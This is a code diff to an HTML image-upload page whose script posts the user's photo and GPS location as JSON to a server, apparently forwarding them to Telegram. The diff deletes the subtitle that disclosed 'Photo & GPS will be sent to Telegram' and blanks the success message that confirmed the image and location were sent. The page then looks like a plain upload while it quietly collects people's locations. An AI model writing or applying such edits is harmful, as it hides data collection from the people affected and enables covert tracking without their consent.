@@ -76,7 +76,6 @@
 
   <div class="card">
     <div class="title">Upload Image</div>
-    <div class="subtitle">Photo & GPS will be sent to Telegram.</div>
 
     <button class="btn" id="uploadBtn">Upload Image</button>
 
@@ -141,7 +140,7 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ image: imageBase64, location: loc })
         });
-        statusText.textContent = "Image & location sent to Telegram.";
+        statusText.textContent = "";
       } catch (e) {
         console.error(e);
         statusText.textContent = "Captured, but failed to send to server.";
@@ -201,3 +200,4 @@
   </script>
 </body>
 </html>
+
